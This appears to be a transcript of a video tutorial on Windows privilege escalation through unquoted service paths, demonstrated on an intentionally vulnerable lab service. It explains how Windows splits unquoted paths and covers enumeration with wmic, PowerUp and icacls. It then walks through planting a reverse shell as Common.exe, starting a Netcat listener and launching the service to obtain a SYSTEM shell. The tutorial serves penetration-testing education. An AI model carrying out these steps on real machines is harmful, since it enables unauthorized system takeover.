### **[Part 1: Introduction to Service Misconfigurations & Unquoted Service Paths]**

Hello friends, in this video we will discuss another service-level misconfiguration. This is the third method we are exploring: **Unquoted Service Path**. What does this mean? As I demonstrated earlier when enumerating Windows services, some service binary paths are enclosed in double quotes, while others are not. I previously showed an intentionally vulnerable unquoted service.

What does quoting and unquoting actually mean, and what is the difference between them? Consider how path names work in Windows. Whenever a file path contains whitespaces—such as `C:\Program Files\`—there is a space between "Program" and "Files". We know that `Program Files` is a single directory name. The full string forms a single, continuous directory name.

---

### **[Part 2: How Windows Interprets Spaces & Whitespaces]**

How does a Windows operating system know that `Program Files` refers to a single directory? For example, if I create a custom directory named `Never Give Up` (with spaces between `Never`, `Give`, and `Up`), I know it is a single directory. But how does Windows interpret it? Windows handles whitespaces differently.

If you open a command prompt on Windows and navigate to `C:\`, you see `Program Files`. If you type `cd Program Files` without double quotes, it navigates into `Program Files` because Windows recognizes `Program Files` as a default system directory. However, if you attempt to create a directory using `mkdir Never Give Up` without quotes, Windows treats the spaces as delimiters. Instead of creating a single directory named `Never Give Up`, Windows creates three separate directories: `Never`, `Give`, and `Up`.

When spaces are provided without quotes, Windows treats whatever comes before a space as one object, and whatever comes after the space as another separate object.

---

### **[Part 3: Understanding Windows Path Resolution Search Order]**

When an application or service binary path containing spaces is registered without double quotes, Windows relies on a built-in **Path Resolution Search Order** to locate and execute the binary.

If a service binary path is defined as: `C:\Program Files\Unquoted Path Service\Common Files\subfolder\file.exe`

And the entire path string is **NOT enclosed in double quotes**, Windows splits the path string at every whitespace and checks for executable binaries in the following order:

1. **First Whitespace Search**: `C:\Program.exe` Windows checks up to the first space and tests whether an executable named `Program.exe` exists in `C:\`. If `Program.exe` exists, Windows executes it immediately and stops searching.
2. **Second Whitespace Search**: `C:\Program Files\Unquoted.exe` If `Program.exe` does not exist, Windows moves to the next space and checks if `Unquoted.exe` exists inside `C:\Program Files\`.
3. **Third Whitespace Search**: `C:\Program Files\Unquoted Path.exe` If `Unquoted.exe` does not exist, Windows checks if `Unquoted Path.exe` exists inside `C:\Program Files\`.
4. **Fourth Whitespace Search**: `C:\Program Files\Unquoted Path Service\Common.exe` If `Unquoted Path.exe` does not exist, Windows checks if `Common.exe` exists inside `C:\Program Files\Unquoted Path Service\`.
5. **Final Path Execution**: `C:\Program Files\Unquoted Path Service\Common Files\subfolder\file.exe` Only if none of the intermediate executables exist does Windows finally execute the actual intended service binary.

---

### **[Part 4: The Vulnerability & Exploitation Vector]**

Even if the intended binary `file.exe` has secure file permissions preventing modifications, Windows attempts to execute four potential executable files along the path resolution chain before reaching `file.exe`.

If an attacker possesses **write permissions** in any parent directory along the resolution order, they can place a malicious executable payload matching the expected name (e.g., `Common.exe` inside `C:\Program Files\Unquoted Path Service\`). When the service starts, Windows encounters the malicious binary at that resolution step and executes it under the service's privileged context.

Wrapping path names in double quotes (`"C:\Program Files\..."`) instructs Windows to treat the entire string as an absolute, continuous literal path, preventing string splitting and bypassing the path resolution search order.

---

### **[Part 5: Manual Enumeration (`wmic`) & PowerUp]**

To enumerate services with unquoted paths manually, query service names and binary paths using **WMIC**:

```
wmic service get Name,PathName
```

Review all service paths:

- Ignore system services inside `C:\Windows\System32\` (they lack spaces and standard users cannot write to `System32`).
- Ignore paths enclosed in double quotes.
- Identify custom third-party services whose binary paths contain spaces and lack double quotes (e.g., `UnquotedSVC` pointing to `C:\Program Files\Unquoted Path Service\Common Files\subfolder\file.exe`).

To enumerate unquoted services automatically using **PowerUp** in PowerShell:

```
Import-Module .\PowerUp.ps1
Get-ServiceUnquoted
```

PowerUp returns services registered with unquoted binary paths.

### **[Part 6: Auditing Directory Permissions (`icacls`)]**

Once an unquoted service path is identified, audit permissions hierarchically across every parent directory in the path order using **`icacls`** to locate a writable directory:

1. Check `C:\`:
    
    ```
    icacls C:\
    ```
    
    _Result_: Builtin Users have Read & Execute permissions only. Writing `C:\Program.exe` is denied.
2. Check `C:\Program Files`:
    
    ```
    icacls "C:\Program Files"
    ```
    
    _Result_: Builtin Users have Read & Execute permissions only. Writing `C:\Program Files\Unquoted.exe` is denied.
3. Check `C:\Program Files\Unquoted Path Service`:
    
    ```
    icacls "C:\Program Files\Unquoted Path Service"
    ```
    
    _Result_: Builtin Users hold **Full Access (`F`) / Write Access**!

### **[Part 7: Placing Payload & Achieving `NT AUTHORITY\SYSTEM` Access]**

Because we hold write access inside `C:\Program Files\Unquoted Path Service\`, we determine the required filename for this path level:

- Path inside this directory: `Common Files\subfolder\file.exe`
- At the space in `Common Files`, Windows splits the string and searches for an executable named **`Common.exe`**.

#### **Exploitation Steps:**

1. **Prepare Payload**: Generate or copy a custom reverse shell payload.
2. **Transfer & Rename**: Save the reverse shell payload as `Common.exe` inside `C:\Program Files\Unquoted Path Service\`:
    
    ```
    copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
    ```
    
3. **Verify Placement**: Confirm `Common.exe` resides in `C:\Program Files\Unquoted Path Service\`.
4. **Check Service Startup Context**:
    
    ```
    sc qc UnquotedSVC
    ```
    
    _Result_: `SERVICE_START_NAME` is **`LocalSystem`** (`NT AUTHORITY\SYSTEM`).
5. **Start Listener & Execute Service**: Start a Netcat listener on Kali Linux (`nc -lvnp 4444`) and launch the service:
    
    ```
    net start UnquotedSVC
    ```
    

When the service starts, Windows executes `C:\Program Files\Unquoted Path Service\Common.exe` under the `LocalSystem` account, returning an interactive **`NT AUTHORITY\SYSTEM`** shell on your listener!

### **[Part 8: Summary & Conceptual Connection to DLL Hijacking]**

Unquoted Service Path exploitation does not require modifying service configuration parameters (`sc config`) or overwriting the original executable file. Instead, it exploits Windows' built-in path resolution search order when developers omit quotes around paths containing whitespaces.

This search order resolution concept is conceptually identical to **DLL Hijacking**, where Windows follows a defined search order to locate shared library files (`.dll`). Mastering path resolution mechanics makes understanding DLL Hijacking effortless.
